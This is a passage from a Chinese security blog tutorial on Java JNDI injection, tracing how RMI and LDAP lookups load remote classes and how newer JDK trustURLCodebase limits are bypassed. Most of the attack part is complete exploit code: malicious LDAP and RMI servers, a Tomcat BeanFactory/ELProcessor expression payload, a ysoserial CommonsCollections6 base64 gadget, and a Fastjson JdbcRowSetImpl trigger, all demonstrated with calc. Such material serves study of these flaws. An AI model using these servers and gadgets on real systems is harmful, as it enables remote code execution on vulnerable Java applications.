的值赋给了它。obj 是一个 ReferenceWrapper_Stub 这个类，是因为这是一个 Reference，有兴趣的师傅可以看一下原理，也比较简单。\n\n\n然后继续往下走，从 decodeObject() 方法进去。\n\n\n先做了一个简单的判断，判断是否为 ReferenceWrapper，也就是判断是否为 Reference 对象。往下是一个比较重要的方法 getOBjectInstance()，从名字上推测这应该是一个初始化的方法。跟进\n\n\n噢对这里不得不提一下 Reference 这个类的构造函数，前文忘记说了，愚蠢的我…………\n\n\n第一个参数是类名，第二个参数是 factory，我觉得 factory 是 Jndi 很好的一个表示，我们可以通过这一个 factory 来代表一个类；第三个参数为地址，这个简单。\n回到正题来，这里到了 getObjectInstance() 这个方法，首先是 builder 的判断，不知道这是啥，注释中写着 “&#x2F;&#x2F; Use builder if installed”，我这里应该是没用，直接跳过判断。\n往下走，是关于 reference 的，这里肯定是用了 reference，强转换，将 refInfo 转换为 Reference。\n\n\n继续往下走，是关于 ref 的，意思是如果 reference 当中定义了 factory，就通过 getObjectFactoryFromReference() 方法来调用 reference 当中的 factory。\n\n\ngetObjectFactoryFromReference() 这个方法中，我们已经获取到了这个恶意类，接着执行加载类的 loadClass() 方法。\n继续往下走，获取到 codebase，并且进行 helper.loadClass()，这里就是我们前面讲到的动态加载类的一个方法 ———— URLClassLoader\n\n\n最后在 newInstance() 这一步执行代码。\n\n\n\n总结一下还是比较简单的，就是 URLClassLoader 的动态类加载，但是讲道理，这个地方是 Jndi 专属的，不是说因为 RMI 的问题。\n\n然后攻击点的话，就是因为客户端进行了 lookup() 方法的调用。\n这个漏洞在 jdk8u121 当中被修复，也就是 lookup() 方法只可以对本地进行 lookup() 方法的调用。\n2. Jndi 结合 ldapldap\nldap 是一种协议，并不是 Java 独有的。\n\nLDAP 既是一类服务，也是一种协议，定义在 RFC2251(RFC4511) 中，是早期 X.500 DAP (目录访问协议) 的一个子集，因此有时也被称为 X.500-lite。\nLDAP Directory 作为一种目录服务，主要用于带有条件限制的对象查询和搜索。目录服务作为一种特殊的数据库，用来保存描述性的、基于属性的详细信息。和传统数据库相比，最大的不同在于目录服务中数据的组织方式，它是一种有层次的树形结构，因此它有优异的读性能，但写性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。\nLDAP 的请求和响应是 ASN.1 格式，使用二进制的 BER 编码，操作类型(Operation)包括 Bind&#x2F;Unbind、Search、Modify、Add、Delete、Compare 等等，除了这些常规的增删改查操作，同时也包含一些拓展的操作类型和异步通知事件。\nldap 的 JNDI 漏洞先起一个 LDAP 的服务，这里需要先在 pom.xml 中导入 unboundid-ldapsdk 的依赖。\n&lt;dependency>  \n &lt;groupId>com.unboundid&lt;/groupId>  \n &lt;artifactId>unboundid-ldapsdk&lt;/artifactId>  \n &lt;version>3.2.0&lt;/version>  \n &lt;scope>test&lt;/scope>  \n&lt;/dependency>\n\n对应的 server 的代码\nLdapServer.java\nimport com.unboundid.ldap.listener.InMemoryDirectoryServer;  \nimport com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  \nimport com.unboundid.ldap.listener.InMemoryListenerConfig;  \nimport com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  \nimport com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  \nimport com.unboundid.ldap.sdk.Entry;  \nimport com.unboundid.ldap.sdk.LDAPException;  \nimport com.unboundid.ldap.sdk.LDAPResult;  \nimport com.unboundid.ldap.sdk.ResultCode;  \nimport javax.net.ServerSocketFactory;  \nimport javax.net.SocketFactory;  \nimport javax.net.ssl.SSLSocketFactory;  \nimport java.net.InetAddress;  \nimport java.net.MalformedURLException;  \nimport java.net.URL;  \n  \npublic class LdapServer &#123;  \n    private static final String LDAP_BASE = \"dc=example,dc=com\";  \n public static void main (String[] args) &#123;  \n        String url = \"http://127.0.0.1:8000/#EvilObject\";  \n int port = 1234;  \n try &#123;  \n            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);  \n config.setListenerConfigs(new InMemoryListenerConfig(  \n                    \"listen\",  \n InetAddress.getByName(\"0.0.0.0\"),  \n port,  \n ServerSocketFactory.getDefault(),  \n SocketFactory.getDefault(),  \n (SSLSocketFactory) SSLSocketFactory.getDefault()));  \n  \n config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));  \n InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);  \n System.out.println(\"Listening on 0.0.0.0:\" + port);  \n ds.startListening();  \n &#125;  \n        catch ( Exception e ) &#123;  \n            e.printStackTrace();  \n &#125;  \n    &#125;  \n    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;  \n        private URL codebase;  \n /**  \n * */ public OperationInterceptor ( URL cb ) &#123;  \n            this.codebase = cb;  \n &#125;  \n        /**  \n * &#123;@inheritDoc&#125;  \n * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  \n */ @Override  \n public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;  \n            String base = result.getRequest().getBaseDN();  \n Entry e = new Entry(base);  \n try &#123;  \n                sendResult(result, base, e);  \n &#125;  \n            catch ( Exception e1 ) &#123;  \n                e1.printStackTrace();  \n &#125;  \n        &#125;  \n        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;  \n            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\"));  \n System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl);  \n e.addAttribute(\"javaClassName\", \"Exploit\");  \n String cbstring = this.codebase.toString();  \n int refPos = cbstring.indexOf('#');  \n if ( refPos > 0 ) &#123;  \n                cbstring = cbstring.substring(0, refPos);  \n &#125;  \n            e.addAttribute(\"javaCodeBase\", cbstring);  \n e.addAttribute(\"objectClass\", \"javaNamingReference\");  \n e.addAttribute(\"javaFactory\", this.codebase.getRef());  \n result.sendSearchEntry(e);  \n result.setResult(new LDAPResult(0, ResultCode.SUCCESS));  \n &#125;  \n  \n    &#125;  \n&#125;\n\n客户端这里和上面是差不多的，只是把服务替换成了 ldap\nJNDILdapClient.java\nimport javax.naming.InitialContext;  \n  \npublic class JNDILdapClient &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        InitialContext initialContext = new InitialContext();  \n RemoteObj remoteObj = (RemoteObj) initialContext.lookup(\"ldap://localhost:1099/remoteObj\");  \n System.out.println(remoteObj.sayHello(\"hello\"));  \n &#125;  \n&#125;\n\n先用 python 起一个 HTTP 服务，再跑服务端代码，再跑客户端。\n运行结果如图。\n\n\n\n这个攻击就还是我们之前说的 Reference\n\n注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。\n所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。\n因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。\n3. jndi 结合 CORBA一个简单的流程是：resolve_str 最终会调用到 StubFactoryFactoryStaticImpl.createStubFactory 去加载远程 class 并调用 newInstance 创建对象，其内部使用的 ClassLoader 是 RMIClassLoader，在反序列化 stub 的上下文中，默认不允许访问远程文件，因此这种方法在实际场景中比较少用。所以就不深入研究了。\n0x03 绕过高版本 jdk 的攻击\n针对的就是 jdk8u121、7u201 这些的高版本 jdk 的绕过手段。\n\n1. jdk 版本在 8u191 之前的绕过手段这里的 jdk 版本是 jdk8u121 &lt; temp &lt; jdk8u191；才可以打。\n绕过方法很简单，就是我们上面说的 ldap 的 JNDI 漏洞，其实这也无关 ldap。通过 RMI 也是可以打的，这也就是 JNDI 通用漏洞，原因是可以动态加载字节码，分析过程和上面是一样的，也有断点，这里就不赘述了。\n\n然后我们集中看一下 jdk8u191 之后的版本对于这个漏洞是通过什么手段来修复的。\n\n修复手段源码\n// 旧版本JDK  \n /**  \n * @param className A non-null fully qualified class name.  \n * @param codebase A non-null, space-separated list of URL strings.  \n */  \n public Class&lt;?> loadClass(String className, String codebase)  \n throws ClassNotFoundException, MalformedURLException &#123;  \n  \n ClassLoader parent = getContextClassLoader();  \n ClassLoader cl =  \n URLClassLoader.newInstance(getUrlArray(codebase), parent);  \n  \n return loadClass(className, cl);  \n &#125;  \n  \n  \n// 新版本JDK  \n /**  \n * @param className A non-null fully qualified class name.  \n * @param codebase A non-null, space-separated list of URL strings.  \n */  \n public Class&lt;?> loadClass(String className, String codebase)  \n throws ClassNotFoundException, MalformedURLException &#123;  \n if (\"true\".equalsIgnoreCase(trustURLCodebase)) &#123;  \n ClassLoader parent = getContextClassLoader();  \n ClassLoader cl =  \n URLClassLoader.newInstance(getUrlArray(codebase), parent);  \n  \n return loadClass(className, cl);  \n &#125; else &#123;  \n return null;  \n &#125;  \n &#125;\n\n在使用 URLClassLoader 加载器加载远程类之前加了个if语句检测\n根据 trustURLCodebase的值是否为true 的值来进行判断，它的值默认为 false。通俗的来说，jdk8u191 之后的版本通过添加 trustURLCodebase 的值是否为 true 这一手段，让我们无法加载 codebase，也就是无法让我们进行 URLClassLoader 的攻击了。\n下面我们来讲 jdk8u191 版本之后的绕过手段。\n2. jdk 版本在 8u191 之后的绕过方式\n这里我们主要的攻击方式是 利用本地恶意 Class 作为Reference Factory\n\n绕过手法一、利用本地恶意 Class 作为 Reference Factory简单地说，就是要服务端本地 ClassPath 中存在恶意 Factory 类可被利用来作为 Reference Factory 进行攻击利用。该恶意 Factory 类必须实现 javax.naming.spi.ObjectFactory 接口，实现该接口的 getObjectInstance() 方法。\n大佬找到的是这个 org.apache.naming.factory.BeanFactory 类，其满足上述条件并存在于 Tomcat8 依赖包中，应用广泛。该类的 getObjectInstance() 函数中会通过反射的方式实例化 Reference 所指向的任意 Bean Class(Bean Class 就类似于我们之前说的那个 CommonsBeanUtils 这种)，并且会调用 setter 方法为所有的属性赋值。而该 Bean Class 的类名、属性、属性值，全都来自于 Reference 对象，均是攻击者可控的。\n现在来看下RMI攻击向量的代码是如何实现的。\n攻击利用\n具体依赖 Tomcat 中的 jar 包为：catalina.jar、el-api.jar、jasper-el.jar。\n恶意服务端代码 JNDIBypassHighJava.java\nimport com.sun.jndi.rmi.registry.ReferenceWrapper;  \nimport org.apache.naming.ResourceRef;  \n  \nimport javax.naming.StringRefAddr;  \nimport java.rmi.registry.LocateRegistry;  \nimport java.rmi.registry.Registry;  \n  \n// JNDI 高版本 jdk 绕过服务端  \npublic class JNDIBypassHighJava &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        System.out.println(\"[*]Evil RMI Server is Listening on port: 1099\");  \n Registry registry = LocateRegistry.createRegistry( 1099);  \n // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory  \n ResourceRef ref = new ResourceRef(\"javax.el.ELProcessor\", null, \"\", \"\",  \n true,\"org.apache.naming.factory.BeanFactory\",null);  \n // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码  \n ref.add(new StringRefAddr(\"forceString\", \"x=eval\"));  \n // 利用表达式执行命令  \n ref.add(new StringRefAddr(\"x\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\")\" +  \n                \".newInstance().getEngineByName(\\\"JavaScript\\\")\" +  \n                \".eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\\\")\"));  \n System.out.println(\"[*]Evil command: calc\");  \n ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);  \n registry.bind(\"Object\", referenceWrapper);  \n &#125;  \n&#125;\n\n呃，讲道理，这里还有一个用 rebind 方法的服务端，代码如下。\nimport org.apache.naming.ResourceRef;  \n  \nimport javax.naming.InitialContext;  \nimport javax.naming.StringRefAddr;  \n  \npublic class JNDIBypassHighJavaServerRebind &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n  \n        InitialContext initialContext = new InitialContext();  \n ResourceRef resourceRef = new ResourceRef(\"javax.el.ELProcessor\",null,\"\",\"\",  \n true,\"org.apache.naming.factory.BeanFactory\",null );  \n resourceRef.add(new StringRefAddr(\"forceString\", \"x=eval\"));  \n resourceRef.add(new StringRefAddr(\"x\",\"Runtime.getRuntime().exe('calc')\" ));  \n initialContext.rebind(\"rmi://localhost:1099/remoteObj\", resourceRef);  \n &#125;  \n&#125;\n\nJNDI 客户端：\nimport javax.naming.Context;  \nimport javax.naming.InitialContext;  \n  \npublic class JNDIBypassHighJavaClient &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        String uri = \"rmi://localhost:1099/Object\";  \n Context context = new InitialContext();  \n context.lookup(uri);  \n &#125;  \n&#125;\n\n执行效果：\n\n\n\n看完了 EXP，我们来分析一下服务端的代码，就以简短一点的 rebind 为例分析。\n\n首先 ELProcessor 这里，是 el 表达式，我太菜了还不会，它是一种命令执行的方式。具体的解释也写在注释里面了。\n后面的 add 这种写法是 BeanFactory.getObjectInstance() 代码的逻辑，第一种命令执行的方式是 ProcessBuilder 的，第二种是 Runtime 的。\n调试分析运行流程开始调试，进 lookup 这里和之前是一样的，我就直接跳过了，直接到 RegistryContext 这个类的 decodeObject() 方法当中，这个方法当中调用了 getObjectInstance()\n\n\n继续往前，不一样的地方在 getObjectFactoryFromReference，我们也可以直接把断点下在这个位置，这样就可以直达了。\n\n\n跟进去看一下逻辑，发现是通过 loadClass() 方法来加载我们传入的 org.apache.naming.factory.BeanFactory 类，然后新建该类实例并将其转换成 ObjectFactory 类型，也就是说，我们传入的 Factory 类必须实现 ObjectFactory 接口类、而 org.apache.naming.factory.BeanFactory 正好满足这一点：\n\n\n继续往下走，跟进看到 getObjectInstance() 方法中，会判断 obj 参数是否是 ResourceRef 类实例，是的话代码才会往下走，这就是为什么我们在恶意 RMI 服务端中构造 Reference 类实例的时候必须要用 Reference 类的子类 ResourceRef 类来创建实例：\n\n\n后续经过一系列的赋值，执行 loadClass 方法，然后继续。接着获取 Bean 类为 javax.el.ELProcessor 后，实例化该类并获取其中的 forceString 类型的内容，其值是我们构造的 x=eval 内容：\n这个思路有点像 python pickle 反序列化的那个，会挤掉一个字符。\n\n\n继续往下调试可以看到，查找 forceString 的内容中是否存在”&#x3D;”号，不存在的话就调用属性的默认 setter 方法，存在的话就取键值、其中键是属性名而对应的值是其指定的 setter 方法。如此，之前设置的 forceString 的值就可以强制将 x 属性的 setter 方法转换为调用我们指定的 eval() 方法了，这是 BeanFactory 类能进行利用的关键点！之后，就是获取 beanClass 即 javax.el.ELProcessor 类的 eval() 方法并和 x 属性一同缓存到 forced 这个 HashMap 中：\n\n\n接着是多个 do while 语句来遍历获取 ResourceRef 类实例 addr 属性的元素，当获取到 addrType 为 x 的元素时退出当前所有循环，然后调用 getContent() 方法来获取x属性对应的 contents 即恶意表达式。这里就是恶意 RMI 服务端中 ResourceRef 类实例添加的第二个元素：\n\n\n获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即javax.el.ELProcessor类的eval()方法并赋值给method变量，最后就是通过method.invoke()即反射调用的来执行&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;calc&#39;]).start()&quot;)：\n\n\n小结一下本地恶意 Class有两个点，一个是 payload 这里，是比较复杂的，经过第一层的 =x，之后，有添加元素的逻辑。算是 el 表达式注入的一些基础吧，后续学了 el 表达式再回来看应该会简单很多。\n另外一个是原理，就是绕过了 trustURLCodebase 的检测，或者说轮不到 trustURLCodebase 来检测。\n绕过手法二、利用 LDAP 返回序列化数据，触发本地 Gadget\n因为 LDAP + Reference 的路子是走不通的，完美思考用链子的方式进行攻击。\n\nLDAP 服务端除了支持 JNDI Reference 这种利用方式外，还支持直接返回一个序列化的对象。如果 Java 对象的 javaSerializedData 属性值不为空，则客户端的 obj.decodeObject() 方法就会对这个字段的内容进行反序列化。此时，如果服务端 ClassPath 中存在反序列化咯多功能利用 Gadget 如 CommonsCollections 库，那么就可以结合该 Gadget 实现反序列化漏洞攻击。\n这也就是平常 JNDI 漏洞存在最多的形式，通过与其他链子结合，比如当时 2022 蓝帽杯，好像有道题目就是 fastjson 绕过高版本 jdk 攻击。\n使用 ysoserial 工具生成 Commons-Collections 这条 Gadget 并进行 Base64 编码输出：\n当然，这个用自己的 EXP 输出也行。\njava -jar ysoserial-master.jar CommonsCollections6 'calc' | base64\n\n输出\nrO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI&#x2F;QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo&#x2F;2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA&#x2F;QAAAAAAAAHcIAAAAEAAAAAB4eHg&#x3D;\n\n恶意 LDAP 服务器如下，主要是在 javaSerializedData 字段内填入刚刚生成的反序列化 payload 数据：\nimport com.unboundid.util.Base64;  \nimport com.unboundid.ldap.listener.InMemoryDirectoryServer;  \nimport com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  \nimport com.unboundid.ldap.listener.InMemoryListenerConfig;  \nimport com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  \nimport com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  \nimport com.unboundid.ldap.sdk.Entry;  \nimport com.unboundid.ldap.sdk.LDAPException;  \nimport com.unboundid.ldap.sdk.LDAPResult;  \nimport com.unboundid.ldap.sdk.ResultCode;  \n  \nimport javax.net.ServerSocketFactory;  \nimport javax.net.SocketFactory;  \nimport javax.net.ssl.SSLSocketFactory;  \nimport java.net.InetAddress;  \nimport java.net.MalformedURLException;  \nimport java.net.URL;  \nimport java.text.ParseException;  \n  \npublic class JNDIGadgetServer &#123;  \n  \n    private static final String LDAP_BASE = \"dc=example,dc=com\";  \n  \n  \n public static void main (String[] args) &#123;  \n  \n        String url = \"http://vps:8000/#ExportObject\";  \n int port = 1234;  \n  \n  \n try &#123;  \n            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);  \n config.setListenerConfigs(new InMemoryListenerConfig(  \n                    \"listen\",  \n InetAddress.getByName(\"0.0.0.0\"),  \n port,  \n ServerSocketFactory.getDefault(),  \n SocketFactory.getDefault(),  \n (SSLSocketFactory) SSLSocketFactory.getDefault()));  \n  \n config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));  \n InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);  \n System.out.println(\"Listening on 0.0.0.0:\" + port);  \n ds.startListening();  \n  \n &#125;  \n        catch ( Exception e ) &#123;  \n            e.printStackTrace();  \n &#125;  \n    &#125;  \n  \n    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;  \n  \n        private URL codebase;  \n  \n  \n /**  \n * */ public OperationInterceptor ( URL cb ) &#123;  \n            this.codebase = cb;  \n &#125;  \n  \n  \n        /**  \n * &#123;@inheritDoc&#125;  \n * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  \n */ @Override  \n public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;  \n            String base = result.getRequest().getBaseDN();  \n Entry e = new Entry(base);  \n try &#123;  \n                sendResult(result, base, e);  \n &#125;  \n            catch ( Exception e1 ) &#123;  \n                e1.printStackTrace();  \n &#125;  \n  \n        &#125;  \n  \n  \n        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;  \n            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\"));  \n System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl);  \n e.addAttribute(\"javaClassName\", \"Exploit\");  \n String cbstring = this.codebase.toString();  \n int refPos = cbstring.indexOf('#');  \n if ( refPos > 0 ) &#123;  \n                cbstring = cbstring.substring(0, refPos);  \n &#125;  \n  \n            // Payload1: 利用LDAP+Reference Factory  \n//            e.addAttribute(\"javaCodeBase\", cbstring);  \n//            e.addAttribute(\"objectClass\", \"javaNamingReference\");  \n//            e.addAttribute(\"javaFactory\", this.codebase.getRef());  \n  \n // Payload2: 返回序列化Gadget  \n try &#123;  \n                e.addAttribute(\"javaSerializedData\", Base64.decode(\"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=\"));  \n &#125; catch (ParseException exception) &#123;  \n                exception.printStackTrace();  \n &#125;  \n  \n            result.sendSearchEntry(e);  \n result.setResult(new LDAPResult(0, ResultCode.SUCCESS));  \n &#125;  \n  \n    &#125;  \n&#125;\n\n服务端，客户端都加上依赖\n&lt;dependency>  \n &lt;groupId>com.alibaba&lt;/groupId>  \n &lt;artifactId>fastjson&lt;/artifactId>  \n &lt;version>1.2.80&lt;/version>  \n&lt;/dependency>\n&lt;dependency>  \n &lt;groupId>commons-collections&lt;/groupId>  \n &lt;artifactId>commons-collections&lt;/artifactId>  \n &lt;version>3.2.1&lt;/version>  \n&lt;/dependency>\n\n客户端代码，这里有两种触发方式，选一种就好了，我这里 fastjson 还没学过，就先用第一种的 lookup 注入。\nimport com.alibaba.fastjson.JSON;  \n  \nimport javax.naming.Context;  \nimport javax.naming.InitialContext;  \n  \npublic class JNDIGadgetClient &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        // lookup参数注入触发  \n Context context = new InitialContext();  \n context.lookup(\"ldap://localhost:1234/ExportObject\");  \n  \n // Fastjson反序列化JNDI注入Gadget触发  \n String payload =\"&#123;\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:1234/ExportObject\\\",\\\"autoCommit\\\":\\\"true\\\" &#125;\";  \n JSON.parse(payload);  \n &#125;  \n&#125;\n\n效果如图\n\n\n调试分析运行流程\n先简单说一说是怎么调试的吧，我觉得断点调试这个完全可以自己手动调试，到了很迷茫看不懂的时候再去看其他师傅的文章比较好。\n\n因为我们这里是 ldap 服务的 lookup() 方法的调用，前文我说每一个服务都对应一个 xxxContext，所以我们要先去找那个对应的 xxxContext，再去找 decodeObject() 方法。\n所以这里的断点就正常调就行，decodeObject() 方法的是在 decodeObject:235, Obj (com.sun.jndi.ldap) 这个地方，可以现在这里打个断点节约时间，也可以自己跟一遍。如果自己跟一遍的话，是要通过 p_lookup 和 c_lookup() 进来的，因为在这之前都没到 xxxContext\n\n\n进到 decodeObject() 方法里面，往下走，看到一个 getURLClassLoader() 这里方法里面。\n\n\n往下走，进入到 trustURLCodebase 的判断，我们之前说过，这里默认就是 false，所以没跳进去，无法进行 URLClassLoader 的实例化。但是这个地方其实我们已经获取到字节码了，只是不实例化就无法加载，也就无法命令执行。\n\n\n这里实例化不通过是不会加载字节码进行命令执行的，我们继续往下走，有一个 deserializeObject() 方法非常引人注目，根据意思，它一定是一个用来反序列化的方法。再查看一下这里被反序列化的东西，是一个 javaSerializedData 数据类型的类。\n\n\n跟进这个方法，遇到了我们无比倾心的 readObject() 方法，OK 至此，入口类的条件满足。\n\n\n读取的字节码被反序列化出来的时候，字节码被加载，造成命令执行\n\n\n\n至此，调试过程结束。\n\n小结一下 LDAP Gadget 